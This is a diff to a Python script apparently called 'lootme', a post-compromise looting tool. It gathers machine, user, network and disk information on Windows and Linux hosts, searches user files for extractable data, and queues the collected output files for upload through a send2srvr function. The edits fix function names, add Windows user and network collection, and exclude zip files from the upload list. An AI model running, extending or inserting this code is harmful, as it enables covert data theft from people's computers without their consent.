@@ -75,7 +75,9 @@ def lootme_windows(outfiles):
         # Dump machine info
         machine_info(outFile)
         machine_info_extra_win(outFile)
-    return
+        user_info_win(outFile)
+        network_info_win(outFile)
+    return outfiles
 ### lootme_windows --end--
 
 ### lootme_linux --start--
@@ -90,7 +92,7 @@ def lootme_linux(outfiles):
         # gather network info
         network_info_lin(outFile)
         # gather disk info
-        disk_info(outFile)
+        disk_info_lin(outFile)
         # search user files for extractable data
         userdata_extract_lin(outFile)
         # search for list of user files
@@ -184,7 +186,7 @@ def network_info_lin(outFile):
 ### Network info Linux --end--
 
 ### Network info Windows --start--
-def network_info_lin(outFile):
+def network_info_win(outFile):
     pArgs = ["wmic", "nicconfig"]
     execoutput_grab(outFile, pArgs)
     pArgs = ["wmic", "netuse"]
@@ -195,7 +197,7 @@ def network_info_lin(outFile):
 ### Network info Windows --end--
 
 ### Disk info Linux --start--
-def disk_info(outFile):
+def disk_info_lin(outFile):
     pArgs = ["df"]
     execoutput_grab(outFile, pArgs)
     pArgs = ["lsblk"]
@@ -320,7 +322,7 @@ def send2srvr(outfiles):
     files = os.listdir('./')
     for f in files:
         regex_query = '^'+platform.uname()[1]+'_[.]*'
-        if re.search(regex_query, f) and f not in outfiles:
+        if re.search(regex_query, f) and f not in outfiles and not re.search('[.]*\.zip$',  f):
             outfiles.append(f)
             print('Adding '+f+' to outfiles.')
 
